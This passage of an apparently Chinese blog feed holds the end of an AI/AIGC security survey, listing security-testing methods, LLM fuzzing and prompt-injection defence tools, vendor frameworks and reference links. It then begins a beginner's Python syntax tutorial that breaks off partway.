Watermarking)</strong></h5><p>该技术是在模型训练阶段，在原模型中嵌入特殊的识别神经元。如果发现有相似模型，可以用特殊的输入样本识别出相似模型是否通过窃取原模型所得。</p><h2 id="三、-AIGC风险的检测技术、工具或评估手段、方法论"><a href="#三、-AIGC风险的检测技术、工具或评估手段、方法论" class="headerlink" title="三、 AIGC风险的检测技术、工具或评估手段、方法论"></a>三、 <strong>AIGC风险的检测技术、工具或评估手段、方法论</strong></h2><h4 id="1-AIGC风险检测技术"><a href="#1-AIGC风险检测技术" class="headerlink" title="1. AIGC风险检测技术"></a>1. <strong>AIGC风险检测技术</strong></h4><ol><li>静态代码分析（Static Code Analysis）： 静态代码分析工具可检查源代码或二进制代码，以识别潜在的漏洞、弱点和安全问题。常用工具包括Coverity、Checkmarx和Fortify。</li><li>动态应用程序安全测试（Dynamic Application Security Testing，DAST）： DAST工具模拟攻击者的行为，测试应用程序的运行时环境，以发现漏洞和安全问题。常用工具包括OWASP ZAP和Nessus。</li><li>渗透测试（Penetration Testing）： 渗透测试是一种模拟真实攻击的方法，以识别系统中的弱点和安全漏洞。通常由专业的安全测试团队执行。</li><li>漏洞扫描工具： 漏洞扫描工具自动扫描网络、应用程序和系统，以检测已知漏洞和弱点。常用工具包括Nessus、OpenVAS和Qualys。</li><li>威胁建模和风险评估： 使用方法论如FAIR（Factor Analysis of Information Risk）和STRIDE，以识别和分析潜在的威胁，评估风险，并制定应对策略。</li><li>安全审查： 对设计文档、源代码和配置进行仔细审查，以识别安全性问题和最佳实践是否得到遵守。</li><li>安全编码指南： 使用安全编码指南和最佳实践，例如OWASP Top Ten，为开发人员提供指导，以编写更安全的代码。</li><li>持续集成&#x2F;持续交付（CI&#x2F;CD）安全工具： 集成安全性测试工具到CI&#x2F;CD流程中，以确保代码在部署之前经过自动安全测试。</li><li>安全信息和事件管理（SIEM）系统： 部署SIEM系统，用于监控网络和应用程序，检测异常活动并响应安全事件。</li><li>模糊测试（Fuzz Testing）： 模糊测试工具生成大量的随机或半随机数据输入，以测试应用程序对异常输入的响应，以发现漏洞。</li><li>身份验证和访问控制审计： 实施身份验证和访问控制审计，以确保只有授权用户可以访问敏感资源。</li><li>外部威胁情报（Threat Intelligence）： 订阅外部威胁情报服务，以了解当前的威胁趋势和攻击者活动。</li><li>安全开发生命周期（SDLC）： 集成安全性活动和控制点到软件开发生命周期中，以确保安全性考虑在每个阶段都有涵盖。</li><li>合规性扫描： 使用自动化合规性扫描工具，以验证系统是否符合适用的法规和标准。</li><li>持续监控和日志分析： 设置系统的持续监控，分析日志以检测异常活动和安全事件。</li></ol><h4 id="2-AIGC风险检测工具"><a href="#2-AIGC风险检测工具" class="headerlink" title="2. AIGC风险检测工具"></a>2. <strong>AIGC风险检测工具</strong></h4><h5 id="LLMFuzzer（风险检测工具）"><a href="#LLMFuzzer（风险检测工具）" class="headerlink" title="LLMFuzzer（风险检测工具）"></a><strong>LLMFuzzer（风险检测工具）</strong></h5><p>链接：<a href="https://github.com/mnns/LLMFuzzer">https://github.com/mnns/LLMFuzzer</a></p><p>LLMFuzzer 是第一个专为大型语言模型 （LLM） 设计的开源模糊测试框架，特别是通过 LLM API 将它们集成到应用程序中。</p><p>特点：</p><p>LLM  的鲁棒模糊测试</p><p>LLM API 集成测试 </p><p>广泛的模糊测试策略 </p><p>模块化架构，易于扩展 </p><h5 id="CleverHans（风险检测工具）"><a href="#CleverHans（风险检测工具）" class="headerlink" title="CleverHans（风险检测工具）"></a><strong>CleverHans（风险检测工具）</strong></h5><p>链接：<a href="https://github.com/cleverhans-lab/cleverhans#contributing">https://github.com/cleverhans-lab/cleverhans#contributing</a></p><p>该存储库包含 CleverHans 的源代码，这是一个 Python 库 对机器学习系统对对抗性示例的脆弱性进行基准测试。</p><p>特点：</p><p>侧重于提供攻击的实现针对机器学习模型，帮助对模型进行基准测试 对抗性实验。</p><h5 id="garak（风险检测工具）"><a href="#garak（风险检测工具）" class="headerlink" title="garak（风险检测工具）"></a><strong>garak（风险检测工具）</strong></h5><p>链接：<a href="https://github.com/leondz/garak">https://github.com/leondz/garak</a></p><p>garak检查是否可以使 LLM 以我们不希望的方式失败。 探测幻觉、数据泄露、及时注射、错误信息、毒性产生、越狱和许多其他弱点。它是针对LLM的一款漏洞扫描程序。</p><h5 id="PsychoEvals（风险检测工具）"><a href="#PsychoEvals（风险检测工具）" class="headerlink" title="PsychoEvals（风险检测工具）"></a><strong>PsychoEvals（风险检测工具）</strong></h5><p>链接：<a href="https://github.com/NextWordDev/psychoevals">https://github.com/NextWordDev/psychoevals</a></p><p>以MBTI人格评估、提示词注入检测为基础的LLM安全评估轻量框架</p><h5 id="rebuff（风险防御工具）"><a href="#rebuff（风险防御工具）" class="headerlink" title="rebuff（风险防御工具）"></a><strong>rebuff（风险防御工具）</strong></h5><p>链接：<a href="https://github.com/protectai/rebuff">https://github.com/protectai/rebuff</a></p><p>Rebuff 旨在通过多层防御来保护 AI 应用程序免受提示注入 （PI） 攻击。</p><p>特点：</p><p>启发式方法：在潜在的恶意输入到达 LLM 之前过滤掉它。</p><p>基于 LLM 的检测：使用专用的 LLM 来分析传入的提示并识别潜在的攻击。</p><p>VectorDB：将以前攻击的嵌入存储在向量数据库中，以识别和防止将来发生类似攻击。</p><p>token令牌：将token添加到提示中以检测泄漏，允许框架将有关传入提示的嵌入存储在向量数据库中，并防止未来的攻击。</p><h5 id="CalypsoAI-Moderator（风险防御工具）"><a href="#CalypsoAI-Moderator（风险防御工具）" class="headerlink" title="CalypsoAI Moderator（风险防御工具）"></a><strong>CalypsoAI Moderator（风险防御工具）</strong></h5><p>链接：<a href="https://calypsoai.com/">https://calypsoai.com/</a></p><p>CalypsoAI Moderator针对数据丢失、恶意代码、越狱和幻觉等安全风险进行防护。</p><h5 id="cspm-gpt（由-GPT-4-提供支持的云安全态势管理-）"><a href="#cspm-gpt（由-GPT-4-提供支持的云安全态势管理-）" class="headerlink" title="cspm-gpt（由 GPT-4 提供支持的云安全态势管理 ）"></a><strong>cspm-gpt（由 GPT-4 提供支持的云安全态势管理 ）</strong></h5><p>链接<a href="https://github.com/samvas-codes/cspm-gpt">https://github.com/samvas-codes/cspm-gpt</a></p><p>展示了如何使用 LLM 和 langchain agent、以提问的方式了解云环境的安全状况。</p><h5 id="微软Counterfit-AI-安全风险评估"><a href="#微软Counterfit-AI-安全风险评估" class="headerlink" title="微软Counterfit( AI 安全风险评估**)**"></a><strong>微软Counterfit(</strong> AI 安全风险评估**)**</h5><p>链接：<a href="https://www.microsoft.com/en-us/security/blog/2021/05/03/ai-security-risk-assessment-using-counterfit/">https://www.microsoft.com/en-us/security/blog/2021/05/03/ai-security-risk-assessment-using-counterfit/</a></p><h2 id="四、-其他企业相关建设思路"><a href="#四、-其他企业相关建设思路" class="headerlink" title="四、 其他企业相关建设思路"></a>四、 <strong>其他企业相关建设思路</strong></h2><h3 id="1-VIVO的安全思考与实践"><a href="#1-VIVO的安全思考与实践" class="headerlink" title="1. VIVO的安全思考与实践"></a>1. <strong>VIVO的安全思考与实践</strong></h3><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641022.png" alt="img"></p><p>AI内生安全左移建设</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641067.png" alt="img"></p><p>内容安全能力建设</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641099.png" alt="img"></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641143.png" alt="img"></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641310.png" alt="img"></p><p>产品运营安全体系建设</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641586.png" alt="img"></p><p>隐私安全体系建设</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641758.png" alt="img"></p><h3 id="2-百度（百度AI安全研究）"><a href="#2-百度（百度AI安全研究）" class="headerlink" title="2. 百度（百度AI安全研究）"></a>2. <strong>百度（百度AI安全研究）</strong></h3><p>链接：<a href="https://anquan.baidu.com/research/aisec">https://anquan.baidu.com/research/aisec</a></p><p>​    <a href="https://anquan.baidu.com/product/llmsec">https://anquan.baidu.com/product/llmsec</a></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641775.png" alt="img"></p><p>整体大纲</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641920.png" alt="img"></p><p>数据安全与隐私保护</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641178.png" alt="img"></p><p>模型保护</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641530.png" alt="img"></p><p>AIGC内容合规</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641608.png" alt="img"></p><p>大模型运营安全风控</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641631.png" alt="img"></p><h3 id="3-阿里云（AIGC安全方案）"><a href="#3-阿里云（AIGC安全方案）" class="headerlink" title="3. 阿里云（AIGC安全方案）"></a>3. <strong>阿里云（AIGC安全方案）</strong></h3><p>链接：<a href="https://www.aliyun.com/activity/security/secAIGC">https://www.aliyun.com/activity/security/secAIGC</a></p><p>AIGC安全开发运营框架</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641667.png" alt="img"></p><p>模型开发阶段</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641797.png" alt="img"></p><p>模型应用上线阶段</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641998.png" alt="img"></p><p>模型运营阶段</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641056.png" alt="img"></p><h3 id="4-网易易盾（内容风险产品）"><a href="#4-网易易盾（内容风险产品）" class="headerlink" title="4. 网易易盾（内容风险产品）"></a>4. <strong>网易易盾（内容风险产品）</strong></h3><p>链接：<a href="https://dun.163.com/solution/aigc">https://dun.163.com/solution/aigc</a></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641115.png" alt="img"></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641206.png" alt="img"></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641241.png" alt="img"></p><h3 id="5-蚂蚁-AI风险检测平台"><a href="#5-蚂蚁-AI风险检测平台" class="headerlink" title="5. 蚂蚁(AI风险检测平台)"></a>5. <strong>蚂蚁(AI风险检测平台)</strong></h3><p>链接：<a href="https://acta.alipay.com/home">https://acta.alipay.com/home</a></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641256.png" alt="img"></p><h3 id="6-微软"><a href="#6-微软" class="headerlink" title="6. 微软"></a>6. <strong>微软</strong></h3><p>1、 微软对抗性机器学习威胁矩阵：<a href="https://github.com/mitre/advmlthreatmatrix">GitHub - mitre&#x2F;advmlthreatmatrix: Adversarial Threat Landscape for AI Systems</a></p><p>2、 微软Counterfit ：<a href="https://www.microsoft.com/en-us/security/blog/2021/05/03/ai-security-risk-assessment-using-counterfit/">AI security risk assessment using Counterfit | Microsoft Security Blog</a></p><h2 id="五、-参考资料附录"><a href="#五、-参考资料附录" class="headerlink" title="五、 参考资料附录"></a>五、 <strong>参考资料附录</strong></h2><table><thead><tr><th><strong>类别</strong></th><th>**文章&#x2F;**<strong>工具</strong> <strong>题目</strong></th><th><strong>相关文章链接</strong></th></tr></thead><tbody><tr><td><strong>相关文章</strong></td><td>AI安全技术与实战图书（腾讯朱雀实验室）</td><td><strong>纸质书</strong></td></tr><tr><td>AI相关文档库</td><td><a href="https://github.com/mo-xiaoxi/GPTSecurity/blob/main/docs/README.md">https://github.com/mo-xiaoxi/GPTSecurity/blob/main/docs/README.md</a></td><td></td></tr><tr><td>生成式人工智能带来的数据安全挑战及应对</td><td><a href="https://www.secrss.com/articles/59595">https://www.secrss.com/articles/59595</a></td><td></td></tr><tr><td>AIGC工具导航</td><td><a href="https://www.aigc.cn/">https://www.aigc.cn/</a></td><td></td></tr><tr><td>AI安全——对抗样本技术综述与应用</td><td><a href="http://www.sicris.cn/CN/abstract/abstract687.shtml">http://www.sicris.cn/CN/abstract/abstract687.shtml</a></td><td></td></tr><tr><td>大模型安全与治理探讨</td><td><a href="https://www.secrss.com/articles/60162">https://www.secrss.com/articles/60162</a></td><td></td></tr><tr><td>破坏模型完整性——数据投毒攻击</td><td><a href="https://flashgene.com/archives/118300.html">https://flashgene.com/archives/118300.html</a></td><td></td></tr><tr><td>华为AI安全白皮书</td><td><a href="https://www-file.huawei.com/-/media/corporate/pdf/cyber-security/ai-security-white-paper-cn.pdf">https://www-file.huawei.com/-/media/corporate/pdf/cyber-security/ai-security-white-paper-cn.pdf</a></td><td></td></tr><tr><td>中国信通院AI安全白皮书</td><td><a href="http://www.caict.ac.cn/kxyj/qwfb/ztbg/202012/P020201209408499730071.pdf">http://www.caict.ac.cn/kxyj/qwfb/ztbg/202012/P020201209408499730071.pdf</a></td><td></td></tr><tr><td>人工智能安全标准化白皮书</td><td><a href="https://www.tc260.org.cn/upload/2023-05-31/1685501487351066337.pdf">https://www.tc260.org.cn/upload/2023-05-31/1685501487351066337.pdf</a></td><td></td></tr><tr><td>MITRE | ATLAS™</td><td><a href="https://atlas.mitre.org/">https://atlas.mitre.org/</a></td><td></td></tr><tr><td>大语言模型工程实践</td><td><a href="https://mp.weixin.qq.com/s/cntF579zWJehGQYJidah6A">https://mp.weixin.qq.com/s/cntF579zWJehGQYJidah6A</a></td><td></td></tr><tr><td>新一代人工智能伦理规范</td><td><a href="https://www.safea.gov.cn/kjbgz/202109/t20210926_177063.html">https://www.safea.gov.cn/kjbgz/202109/t20210926_177063.html</a></td><td></td></tr><tr><td>模型安全后门攻击</td><td><a href="https://aisecuritybook.github.io/source/chap8.html#sec-input-space-backdoor">https://aisecuritybook.github.io/source/chap8.html#sec-input-space-backdoor</a></td><td></td></tr><tr><td>训练数据投毒相关文章</td><td><a href="https://www.lakera.ai/blog/training-data-poisoninghttps://ar5iv.labs.arxiv.org/html/2202.10276https://ar5iv.labs.arxiv.org/html/2207.08486https://aisecuritybook.github.io/source/chap4.html">https://www.lakera.ai/blog/training-data-poisoninghttps://ar5iv.labs.arxiv.org/html/2202.10276https://ar5iv.labs.arxiv.org/html/2207.08486https://aisecuritybook.github.io/source/chap4.html</a></td><td></td></tr><tr><td>语言模型中的训练数据泄漏分析</td><td><a href="https://ar5iv.labs.arxiv.org/html/2101.05405">https://ar5iv.labs.arxiv.org/html/2101.05405</a></td><td></td></tr><tr><td>利用对抗性鲁棒性保护AI系统</td><td><a href="https://research.ibm.com/blog/securing-ai-workflows-with-adversarial-robustness">https://research.ibm.com/blog/securing-ai-workflows-with-adversarial-robustness</a></td><td></td></tr><tr><td>了解和管理人工智能威胁</td><td><a href="https://www.isaca.org/resources/isaca-journal/issues/2020/volume-1/understanding-and-managing-the-artificial-intelligence-threat">https://www.isaca.org/resources/isaca-journal/issues/2020/volume-1/understanding-and-managing-the-artificial-intelligence-threat</a></td><td></td></tr><tr><td>OWASP十大大型语言模型应用解释</td><td><a href="https://www.lakera.ai/blog/owasp-top-10-for-large-language-model-applications-guide">https://www.lakera.ai/blog/owasp-top-10-for-large-language-model-applications-guide</a></td><td></td></tr><tr><td>AI安全——对抗样本技术综述与应用</td><td><a href="http://www.sicris.cn/CN/abstract/abstract687.shtml">http://www.sicris.cn/CN/abstract/abstract687.shtml</a></td><td></td></tr><tr><td>模型安全：对抗攻击</td><td><a href="https://aisecuritybook.github.io/source/chap6.html">https://aisecuritybook.github.io/source/chap6.html</a></td><td></td></tr><tr><td>人工智能安全笔记（5）后门攻击</td><td><a href="https://zhuanlan.zhihu.com/p/626020461">https://zhuanlan.zhihu.com/p/626020461</a></td><td></td></tr><tr><td>模型安全：后门攻击</td><td><a href="https://aisecuritybook.github.io/source/chap8.html#sec-input-space-backdoor">https://aisecuritybook.github.io/source/chap8.html#sec-input-space-backdoor</a></td><td></td></tr><tr><td>模型窃取攻击相关</td><td><a href="https://owasp.org/www-project-machine-learning-security-top-10/docs/ML05_2023-Model_Stealinghttps://aisecuritybook.github.io/source/chap10.htmlhttps://aisecuritybook.github.io/source/chap10.htmlhttps://aisecuritybook.github.io/source/chap4.html">https://owasp.org/www-project-machine-learning-security-top-10/docs/ML05_2023-Model_Stealinghttps://aisecuritybook.github.io/source/chap10.htmlhttps://aisecuritybook.github.io/source/chap10.htmlhttps://aisecuritybook.github.io/source/chap4.html</a></td><td></td></tr><tr><td>数据安全：攻击</td><td><a href="https://aisecuritybook.github.io/source/chap4.html">https://aisecuritybook.github.io/source/chap4.html</a></td><td></td></tr><tr><td>模型属性推理攻击</td><td><a href="https://www.nightfall.ai/ai-security-101/model-attribute-inference-attackshttps://aisecuritybook.github.io/source/chap4.html">https://www.nightfall.ai/ai-security-101/model-attribute-inference-attackshttps://aisecuritybook.github.io/source/chap4.html</a></td><td></td></tr><tr><td>AI挖洞？利用ChatGPT辅助工作初探</td><td><a href="https://www.gandalf.site/2022/12/aichatgpt.html">https://www.gandalf.site/2022/12/aichatgpt.html</a></td><td></td></tr><tr><td>读懂AI另一面：“我”存在被滥用和失控风险</td><td><a href="http://news.enorth.com.cn/system/2023/11/27/054709138.shtml">http://news.enorth.com.cn/system/2023/11/27/054709138.shtml</a></td><td></td></tr><tr><td>什么是动态应用安全测试（DAST）</td><td><a href="https://juejin.cn/post/7125355591283212324">https://juejin.cn/post/7125355591283212324</a></td><td></td></tr><tr><td>7 个顶级静态代码分析工具</td><td><a href="https://www.infoq.cn/article/w0dqwy4dwzxyixbaxl5d">https://www.infoq.cn/article/w0dqwy4dwzxyixbaxl5d</a></td><td></td></tr><tr><td>长亭安全服务白皮书</td><td><a href="https://portal-data-cn.obs.cn-north-4.myhuaweicloud.com/marketplace/public/app/attachment/20190815/227c1509-9dd0-44c6-b5da-9ddcbbeeba13/1908150623086994.pdf">https://portal-data-cn.obs.cn-north-4.myhuaweicloud.com/marketplace/public/app/attachment/20190815/227c1509-9dd0-44c6-b5da-9ddcbbeeba13/1908150623086994.pdf</a></td><td></td></tr><tr><td>渗透测试的8个步骤</td><td><a href="https://www.freebuf.com/column/196291.html">https://www.freebuf.com/column/196291.html</a></td><td></td></tr><tr><td>AI 安全风险管理的最佳实践</td><td><a href="https://www.microsoft.com/en-us/security/blog/2021/12/09/best-practices-for-ai-security-risk-management/">https://www.microsoft.com/en-us/security/blog/2021/12/09/best-practices-for-ai-security-risk-management/</a></td><td></td></tr><tr><td>代码安全指南</td><td><a href="https://github.com/Tencent/secguide">https://github.com/Tencent/secguide</a></td><td></td></tr><tr><td>2023 年 CI&#x2F;CD 管道的安全性和合规性最佳做法</td><td><a href="https://www.opsmx.com/blog/security-and-compliance-best-practices-for-ci-cd-pipelines-in-2023/">https://www.opsmx.com/blog/security-and-compliance-best-practices-for-ci-cd-pipelines-in-2023/</a></td><td></td></tr><tr><td>SIEM：安全信息和事件管理解释</td><td><a href="https://www.splunk.com/en_us/blog/learn/siem-security-information-event-management.html">https://www.splunk.com/en_us/blog/learn/siem-security-information-event-management.html</a></td><td></td></tr><tr><td>安全软件开发生命周期简介</td><td><a href="https://www.freebuf.com/articles/network/306867.html">https://www.freebuf.com/articles/network/306867.html</a></td><td></td></tr><tr><td><strong>风险<strong><strong>检测</strong></strong>工具</strong></td><td>LLMFuzzer</td><td><a href="https://github.com/mnns/LLMFuzzer">https://github.com/mnns/LLMFuzzer</a></td></tr><tr><td>CleverHans</td><td><a href="https://github.com/cleverhans-lab/cleverhans#contributing">https://github.com/cleverhans-lab/cleverhans#contributing</a></td><td></td></tr><tr><td>garak</td><td><a href="https://github.com/leondz/garak">https://github.com/leondz/garak</a></td><td></td></tr><tr><td>PsychoEvals</td><td><a href="https://github.com/NextWordDev/psychoevals">https://github.com/NextWordDev/psychoevals</a></td><td></td></tr><tr><td>微软Counterfit</td><td><a href="https://github.com/Azure/counterfit/">https://github.com/Azure/counterfit/</a></td><td></td></tr><tr><td>CodeQL</td><td><a href="https://github.com/github/codeql">https://github.com/github/codeql</a></td><td></td></tr><tr><td>Hacker AI</td><td><a href="https://theresanaiforthat.com/ai/hacker-ai/">https://theresanaiforthat.com/ai/hacker-ai/</a></td><td></td></tr><tr><td>snyk 代码检查器</td><td><a href="https://snyk.io/code-checker/">https://snyk.io/code-checker/</a></td><td></td></tr><tr><td>Machine Learning Privacy Meter</td><td><a href="https://github.com/privacytrustlab/ml_privacy_meter">https://github.com/privacytrustlab/ml_privacy_meter</a></td><td></td></tr><tr><td>Robuscope</td><td><a href="https://www.iks.fraunhofer.de/en/services/testing-ai-models-online.html">https://www.iks.fraunhofer.de/en/services/testing-ai-models-online.html</a></td><td></td></tr><tr><td>scribbr</td><td><a href="https://www.scribbr.com/">https://www.scribbr.com/</a></td><td></td></tr><tr><td>PaddleSleeve</td><td><a href="https://github.com/PaddlePaddle/PaddleSleeve">https://github.com/PaddlePaddle/PaddleSleeve</a></td><td></td></tr><tr><td>trinka</td><td><a href="https://www.trinka.ai/ai-content-detector">https://www.trinka.ai/ai-content-detector</a></td><td></td></tr><tr><td>Awesome-Backdoor-in-Deep-Learning</td><td><a href="https://github.com/zihao-ai/Awesome-Backdoor-in-Deep-Learning">https://github.com/zihao-ai/Awesome-Backdoor-in-Deep-Learning</a></td><td></td></tr><tr><td>外部威胁情报平台</td><td><a href="https://ti.360.net/">360安全大脑</a><a href="https://x.threatbook.com/">微步在线X情报社区-威胁情报查询_威胁分析平台_开放社区</a><a href="https://ti.qianxin.com/">奇安信威胁情报中心</a><a href="https://ti.dbappsecurity.com.cn/">安全星图平台</a><a href="https://www.antiycloud.com/#/antiy/index">安天威胁情报中心</a></td><td></td></tr><tr><td><strong>风险****防御工具</strong></td><td>rebuff</td><td><a href="https://github.com/protectai/rebuff">https://github.com/protectai/rebuff</a></td></tr><tr><td>CalypsoAI Moderator</td><td><a href="https://calypsoai.com/">https://calypsoai.com/</a></td><td></td></tr><tr><td>cspm-gpt</td><td><a href="https://github.com/samvas-codes/cspm-gpt">https://github.com/samvas-codes/cspm-gpt</a></td><td></td></tr></tbody></table>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Python基础笔记</title>
    <link href="/2025/01/06/Python%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/01/06/Python%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Python基础笔记"><a href="#Python基础笔记" class="headerlink" title="Python基础笔记"></a>Python基础笔记</h1><h2 id="1-基础语法"><a href="#1-基础语法" class="headerlink" title="1.基础语法"></a>1.基础语法</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>默认情况下，Python 3 源码文件以 <strong>UTF-8</strong> 编码，所有字符串都是 unicode 字符串。</p><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><ul><li>第一个字符必须是字母表中字母或下划线 _ 。</li><li>标识符的其他的部分由字母、数字和下划线组成。</li><li>标识符对大小写敏感。</li></ul><p>在 Python 3 中，可以用中文作为变量名，非 ASCII 标识符也是允许的了。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>python的单行注释以#字开头</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">print</span> (<span class="hljs-string">&quot;Hello, Python!&quot;</span>) <span class="hljs-meta"># 第一个注释</span><br></code></pre></td></tr></table></figure><p>多行注释可以用多个 # 号，还有  ‘’’ 和 “””：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 第一个注释</span><br><span class="hljs-comment"># 第二个注释</span><br> <br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">第三注释</span><br><span class="hljs-string">第四注释</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br> <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">第五注释</span><br><span class="hljs-string">第六注释</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h3><p>python最具特色的就是使用缩进来表示代码块，不需要使用大括号 {} 。</p><p>缩进的空格数是可变的，但是同一个代码块的语句必须包含相同的缩进空格数。实例如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">if</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;True&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;False&quot;</span>)<br></code></pre></td></tr></table></figure><p>以下代码最后一行语句缩进数的空格数不一致，会导致运行错误：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">if</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Answer&quot;</span>)<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;True&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Answer&quot;</span>)<br>  <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;False&quot;</span>)    # 缩进不一致，会导致运行错误<br></code></pre></td></tr></table></figure><h3 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h3><p>Python 通常是一行写完一条语句，但如果语句很长，我们可以使用反斜杠 \ 来实现多行语句，例如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">total</span> = item_one + <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>        item_two + <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>        item_three<br></code></pre></td></tr></table></figure><p>在  [], {}, 或 () 中的多行语句，不需要使用反斜杠 \，例如：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">total</span> = [<span class="hljs-string">&#x27;item_one&#x27;</span>, <span class="hljs-string">&#x27;item_two&#x27;</span>, <span class="hljs-string">&#x27;item_three&#x27;</span>,<br>        <span class="hljs-string">&#x27;item_four&#x27;</span>, <span class="hljs-string">&#x27;item_five&#x27;</span>]<br></code></pre></td></tr></table></figure><h3 id="数字-Number-类型"><a href="#数字-Number-类型" class="headerlink" title="数字(Number)类型"></a>数字(Number)类型</h3><p>python中数字有四种类型：整数、布尔型、浮点数和复数。</p><ul><li><strong>int</strong> (整数), 如 1, 只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。</li><li><strong>bool</strong> (布尔), 如 True。</li><li><strong>float</strong> (浮点数), 如 1.23、3E-2</li><li><strong>complex</strong> (复数), 如 1 + 2j、 1.1 + 2.2j</li></ul><h3 id="字符串-String"><a href="#字符串-String" class="headerlink" title="字符串(String)"></a>字符串(String)</h3><ul><li>Python 中单引号 ‘ 和双引号 “ 使用完全相同。</li><li>使用三引号(‘’’ 或 “””)可以指定一个多行字符串。</li><li>转义符 \。</li><li>反斜杠可以用来转义，使用 r 可以让反斜杠不发生转义。 如 <strong>r”this is a line with \n”</strong> 则 \n 会显示，并不是换行。</li><li>按字面意义级联字符串，如 <strong>“this “ “is “ “string”</strong> 会被自动转换为 <strong>this is string</strong>。</li><li>字符串可以用 + 运算符连接在一起，用 * 运算符重复。</li><li>Python 中的字符串有两种索引方式，从左往右以 0 开始，从右往左以 -1 开始。</li><li>Python 中的字符串不能改变。</li><li>Python 没有单独的字符类型，一个字符就是长度为 1 的字符串。</li><li>字符串的截取的语法格式如下：变量[头下标:尾下标:步长]</li></ul><h3 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h3><p>函数之间或类的方法之间用空行分隔，表示一段新的代码的开始。类和函数入口之间也用一行空行分隔，以突出函数入口的开始。</p><p>空行与代码缩进不同，空行并不是 Python 语法的一部分。书写时不插入空行，Python 解释器运行也不会出错。但是空行的作用在于分隔两段不同功能或含义的代码，便于日后代码的维护或重构。</p><p><strong>记住：</strong>空行也是程序代码的一部分。</p><h3 id="多个语句构成代码组"><a href="#多个语句构成代码组" class="headerlink" title="多个语句构成代码组"></a>多个语句构成代码组</h3><p>缩进相同的一组语句构成一个代码块，我们称之代码组。</p><p>像if、while、def和class这样的复合语句，首行以关键字开始，以冒号( : )结束，该行之后的一行或多行代码构成代码组。</p><p>我们将首行及后面的代码组称为一个子句(clause)。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span 